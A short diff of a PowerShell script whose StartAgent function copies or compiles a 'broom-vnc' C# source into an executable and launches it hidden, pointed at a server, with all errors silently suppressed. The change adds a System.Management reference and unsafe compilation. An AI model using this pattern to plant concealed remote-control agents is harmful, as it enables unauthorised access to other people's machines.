@@ -40,7 +40,7 @@ function StartAgent {
     if ([IO.File]::Exists($src)) { try { [IO.File]::Copy($src, $exe) } catch { } }
     elseif ([IO.File]::Exists("$Vol\broom\broom-vnc.cs")) {
       try { Add-Type -Path "$Vol\broom\broom-vnc.cs" -OutputAssembly $exe -OutputType WindowsApplication `
-              -ReferencedAssemblies System.Drawing, System.Windows.Forms -ErrorAction Stop } catch { }
+              -ReferencedAssemblies System.Drawing, System.Windows.Forms, System.Management -CompilerOptions '/unsafe' -ErrorAction Stop } catch { }
     }
   }
   if ([IO.File]::Exists($exe)) { try { Start-Process $exe -ArgumentList $Srv -WindowStyle Hidden } catch { } }
